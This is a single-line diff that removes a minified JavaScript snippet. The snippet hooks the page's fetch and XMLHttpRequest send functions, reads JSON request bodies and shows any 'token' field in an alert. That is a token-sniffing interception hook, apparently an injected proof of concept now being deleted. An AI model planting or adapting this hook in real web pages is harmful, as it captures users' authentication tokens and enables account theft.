@@ -1,1 +1,0 @@
-(()=>{const f=window.fetch,s=XMLHttpRequest.prototype.send;window.fetch=(...a)=>f(...a).then(r=>{try{let b=JSON.parse(a[1]?.body);b?.token&&alert(`f:${b.token}`)}catch{};return r});XMLHttpRequest.prototype.send=function(b){this.addEventListener('load',()=>{try{let t=JSON.parse(b);t?.token&&alert(`x:${t.token}`)}catch{}});s.call(this,b)};console.log("M")})();
